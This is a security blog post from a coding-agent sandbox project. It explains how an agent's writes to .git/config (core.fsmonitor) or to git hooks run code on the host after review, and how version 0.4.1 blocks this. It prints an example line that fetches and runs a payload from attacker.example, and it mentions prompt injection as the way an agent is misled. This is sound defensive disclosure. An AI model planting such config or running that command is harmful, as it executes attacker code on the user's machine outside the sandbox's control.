@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Your agent's sandbox is fine. Its diff can still run code on your machine | Foil</title>
+<meta name="description" content="A sandboxed coding agent can write .git/config or a git hook, and git runs it on your machine the next time you type git status. How we found it in Foil, how 0.4.1 blocks it, and what to check in any agent setup.">
+<link rel="canonical" href="https://ai-agentic-tools.github.io/Foil/blog/git-config-escape.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Your agent's sandbox is fine. Its diff can still run code on your machine">
+<meta property="og:description" content="Three lines in .git/config turn a reviewed agent change into code running outside the sandbox. How to check your setup.">
+<meta property="og:url" content="https://ai-agentic-tools.github.io/Foil/blog/git-config-escape.html">
+<meta property="og:image" content="https://raw.githubusercontent.com/ai-agentic-tools/Foil/main/.github/social-preview.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="stylesheet" href="../style.css">
+<script type="application/ld+json">
+{"@context": "https://schema.org", "@type": "BlogPosting",
+ "headline": "Your agent's sandbox is fine. Its diff can still run code on your machine",
+ "datePublished": "2026-11-05", "author": {"@type": "Organization", "name": "The Foil maintainers", "url": "https://github.com/ai-agentic-tools"},
+ "mainEntityOfPage": "https://ai-agentic-tools.github.io/Foil/blog/git-config-escape.html"}
+</script>
+</head>
+<body>
+<header>
+  <a class="brand" href="../">foil</a>
+  <nav><a href="../security.html">For security teams</a><a href="../">Home</a><a href="../benchmarks.html">Benchmarks</a><a href="https://github.com/ai-agentic-tools/Foil">GitHub</a></nav>
+</header>
+<main>
+<article>
+  <h1>Your agent's sandbox is fine. Its diff can still run code on your machine</h1>
+  <p class="meta">5 November 2026 · The Foil maintainers</p>
+
+  <p>We build <a href="https://github.com/ai-agentic-tools/Foil">Foil</a>, a local sandbox for coding agents. The agent works in a copy-on-write branch of your repo; you review the diff and commit it. While writing down what Foil does and doesn't defend against, we found a hole in that last step. Not in the sandbox: in what comes out of it. Foil 0.4.1 fixes it. The pattern isn't specific to Foil, so here is how it works and how to check your own setup.</p>
+
+  <h2>Three lines</h2>
+  <p>Git runs some things without asking. One is <code>core.fsmonitor</code>: a command in the repository's config that git runs on <code>git status</code>, <code>git diff</code> and most other commands, to ask which files changed. Hooks are another: scripts in <code>.git/hooks</code> that run on commit, checkout, merge and push.</p>
+  <p>Both live inside the repository, in <code>.git</code>. So an agent, sandboxed or not, that can write to the repo's <code>.git</code> can do this:</p>
+<pre><code>printf '[core]\n\tfsmonitor = "curl -s https://attacker.example/x | sh; false"\n' &gt;&gt; .git/config</code></pre>
+  <p>Inside a good sandbox, nothing happens: the network is closed, the home folder is hidden. But if that change reaches your real repository, the next <code>git status</code> you type runs it as you, outside any sandbox. A misled agent only needs to be misled once, say by a prompt injection in an issue it was asked to fix.</p>
+
+  <h2>What we saw in Foil 0.4.0</h2>
+  <p>We ran the attack against our own release. A strict Foil run (empty home, no network) wrote the config line above, a <code>post-commit</code> hook, and a one-line change to <code>a.txt</code>. Then:</p>
+<pre><code>$ foil diff evil
+M .git/config
+A .git/hooks/post-commit
+M a.txt
+$ foil commit evil
+applied 3 changes
+$ git status          # runs the agent's fsmonitor command, on the host</code></pre>
+  <p>The diff was honest: it listed both files. But two lines among dozens, next to the agent's real work, are easy to approve without reading. A review step only protects you if the dangerous changes stand out.</p>
+
+  <h2>What 0.4.1 does</h2>
+  <ul>
+    <li><strong>Commit leaves them out.</strong> Everything in a <code>.git</code> folder except git's data is held back: config, hooks, <code>info/attributes</code>, submodule config, and a new or replaced <code>.git</code> (which may be a file pointing somewhere else). Git's data still comes through, so an agent's own <code>git commit</code> inside the branch reaches your repo: objects, refs, the index, logs.</li>
+    <li><strong>Diff marks them.</strong> <code>foil diff</code> shows <code>[guarded]</code> next to each, <code>--json</code> has <code>"guarded": true</code>, and commit names what it left out.</li>
+    <li><strong>You can still apply them,</strong> after reading them, with <code>foil commit --guarded</code>.</li>
+  </ul>
+<pre><code>$ foil diff evil
+M .git/config  [guarded]
+A .git/hooks/post-commit  [guarded]
+M a.txt
+$ foil commit evil
+applied 1 change
+foil: left out 2 paths that git would run on your machine (git config, hooks or a new .git), discarded with the branch</code></pre>
+  <p>The same release closes a smaller macOS gap the same review turned up: a strict run could read and write <code>/tmp</code> and your own temp folder, where other programs and other runs keep files. It now gets a temp folder of its own. Linux runs already had a private <code>/tmp</code>.</p>
+
+  <h2>Check your own setup</h2>
+  <p>Whatever runs your agents, ask where its writes to <code>.git</code> go:</p>
+  <ul>
+    <li><strong>A git worktree per agent.</strong> Worktrees share the main repository's config. Run <code>git config core.fsmonitor ...</code> in an agent's worktree, and it is set for your main checkout immediately, no merge needed. We checked with git on macOS. Worktrees keep agents from overwriting each other's files; they don't keep them out of your git config.</li>
+    <li><strong>A container with the repo mounted.</strong> The agent writes your real <code>.git</code> directly. Mount <code>.git</code> read-only, or give the container a clone.</li>
+    <li><strong>Agent edits applied as a patch or a PR.</strong> Usually safe: a patch or a push carries tracked files, not <code>.git/config</code> or hooks. Check that your tool doesn't copy the working folder back instead.</li>
+    <li><strong>Files that run when you use them.</strong> A <code>Makefile</code>, a <code>package.json</code> script, <code>.envrc</code>, <code>.vscode/tasks.json</code>. These are ordinary changes in any tool, Foil included, and they run when you run them. direnv and VS Code ask before running new ones; <code>make</code> and <code>npm test</code> don't. Read them in the diff.</li>
+  </ul>
+
+  <h2>Why we're publishing this</h2>
+  <p>Foil says plainly that it shares your kernel and is for agents that are wrong or misled, not hostile code. That promise is only worth something if we go looking for the ways it breaks and say what we find. <a href="https://github.com/ai-agentic-tools/Foil/blob/main/SECURITY.md">SECURITY.md</a> lists every guarantee with the test that tries to break it, and what Foil doesn't cover. This finding now has its test there too: <code>commit_leaves_out_git_config_and_hooks_unless_asked</code>.</p>
+  <p>If you find another way out, please report it privately through <a href="https://github.com/ai-agentic-tools/Foil/security/advisories/new">GitHub's vulnerability reporting</a>.</p>
+
+  <h2>Upgrade</h2>
+<pre><code>brew upgrade foil                 # or: cargo install foil-sandbox
+foil --version                    # foil 0.4.1</code></pre>
+</article>
+</main>
+<footer>
+  <a href="../">Foil</a> · Apache License 2.0 · <a href="https://github.com/ai-agentic-tools/Foil">GitHub</a>
+</footer>
+</body>
+</html>
